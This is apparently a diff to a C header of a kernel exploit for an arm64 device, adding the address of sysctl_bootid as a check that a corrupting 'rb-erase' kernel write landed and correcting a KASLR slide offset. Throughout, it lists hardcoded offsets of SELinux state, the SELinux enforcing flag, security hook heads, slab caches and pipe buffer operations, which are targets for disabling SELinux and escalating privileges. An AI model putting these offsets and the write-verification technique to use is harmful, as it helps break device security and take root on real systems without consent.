@@ -66,6 +66,13 @@
 #define SELINUX_BLOB_SIZES_OFF 0x022df670ULL /* ✓ vmlinux-to-elf nm */
 #define SELINUX_STATE_OFF 0x02a25b90ULL      /* ✓ vmlinux-to-elf nm */
 #define SELINUX_ENFORCING_OFF 0x02a25b90ULL  /* ✓ vmlinux-to-elf nm */
+/* &sysctl_bootid (u8[16] behind /proc/sys/kernel/random/boot_id). ✓ nm:
+ * "02a3f345 b sysctl_bootid" (u8 array => unaligned, fine for an arm64 str).
+ * proc_do_uuid() only regenerates the uuid when uuid[8]==0, so an 8-byte store
+ * over uuid[0..7] is VISIBLE in the boot_id string and has no side effects =>
+ * the harmless, 100%-reliable "did the chain-walk rb-erase store execute?"
+ * oracle (see BOOTID-WRITE-PROOF in fops.c). */
+#define SYSCTL_BOOTID_OFF 0x02a3f345ULL      /* ✓ vmlinux-to-elf nm */
 #define SECURITY_HOOK_HEADS_OFF 0x022defe0ULL /* ✓ vmlinux-to-elf nm */
 #define KMALLOC_CACHES_OFF 0x022deb18ULL     /* ✓ vmlinux-to-elf nm */
 #define ANON_PIPE_BUF_OPS_OFF 0x0214c128ULL  /* ✓ IDA output.elf verified */
@@ -93,6 +100,7 @@
 #define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
 #define SELINUX_STATE (KIMAGE_TEXT_BASE + SELINUX_STATE_OFF)
 #define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
+#define SYSCTL_BOOTID (KIMAGE_TEXT_BASE + SYSCTL_BOOTID_OFF)
 #define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
 #define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
 #define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
@@ -103,7 +111,8 @@
 #define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02886cf8ULL
 #define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
 #define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
-#define SLIDE_SYSCTL_BOOTID_OFF 0x02886cf8ULL
+#define SLIDE_SYSCTL_BOOTID_OFF SYSCTL_BOOTID_OFF  /* was 0x02886cf8 (copy of
+  * SLIDE_RANDOM_BOOT_ID_DATA_OFF, not a symbol); nm says sysctl_bootid=0x2a3f345 */
 
 #define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
 #define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
